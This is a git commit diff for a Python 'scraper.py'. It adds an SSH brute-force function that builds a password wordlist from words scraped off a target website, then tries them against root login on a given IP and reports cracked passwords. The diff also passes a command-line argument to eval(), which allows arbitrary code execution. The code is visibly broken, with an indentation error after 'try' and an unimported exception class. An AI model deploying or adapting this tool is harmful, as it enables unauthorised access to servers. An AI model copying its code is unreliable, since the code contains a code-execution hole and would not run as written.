f30ca3344630b780a878dfb9ff1182603a87f0b4
kid-c-plus <ericlewiswork@gmail.com>
2019-10-10 15:22:54 -0500

    scraper.py completed but untested

--- scraper.py
+++ scraper.py
@@ -1,12 +1,14 @@
 import getopt
 import sys
 from collections import Counter
+import time
 
 from bs4 import BeautifulSoup
 import requests
+import paramiko
 
 # ---------------------------------------------------------------- 
-# class ScrapedSite - 
+# class ScrapedSite - container class for BeautifulSoup object
 # ---------------------------------------------------------------- 
 class ScrapedSite:
 
@@ -42,19 +44,57 @@ class ScrapedSite:
                 hrefs += [link.get('href').lower() for link in subsoup.find_all("a") if link.get('href').lower() not in hrefs]
                 counter += 1
 
-def main():
-    opts, args = getopt.getopt(sys.argv[1:], "hrlt:")
-    recursive = False
-    local = False
-    for o, a in opts:
-        if o == "-h":
-            print_help()
-            exit()
-        elif o == "-r":
-            recursive = True
-        elif o == "-l":
-            
+# function to brute-force a given ssh login
+def ssh_break(ip, wordlist, sleep=0.5, user="root", port=22):
+    client = paramiko.SSHClient()
+    for word in wordlist:
+        try:
+            client.connect(ip, port=port, username=user, password=word)
+        except AuthenticationException as e:
+            time.sleep(sleep)   
+        else:
+            client.close()
+            return word
 
+def main():
+    try:
+    opts, args = getopt.getopt(sys.argv[1:], "hrlt:s:u:p:")
+        assert len(args) == 2, "Wrong number of arguments"
+
+        # Keyword argument dictionaries for SiteScraper object and ssh_break function
+        siteargs = {}
+        sshargs = {}
+        for o, a in opts:
+            if o == "-h":
+                print_help()
+                exit()
+            elif o == "-r":
+                siteargs['recursive'] = True
+            elif o == "-l":
+                siteargs['local'] = True
+            elif o == "-t":
+                siteargs['transform'] = eval(a)   
+            elif o == "-s":
+                sshargs['sleep'] = float(a)
+            elif o == "-u":
+                sshargs['user'] = a
+            elif o == "-p":
+                sshargs['port'] = int(a)
+
+        rooturl, ssh_ip = args
+
+        site = ScrapedSite(rooturl, **siteargs)
+        
+        password = ssh_break(ssh_ip, sorted(site.wordlist, key=site.wordlist.get, reverse=True), **sshargs)
+
+        if password:
+            print("Password Cracked! The password for user %s is %s" % (sshargs.get('user', "root"), password))
+        else:
+            print("Password not found.")
+
+    except Exception as e:
+        print("Error! %s" % e)
+        print_help()
 
 def print_help():
     print(open("help.txt"))
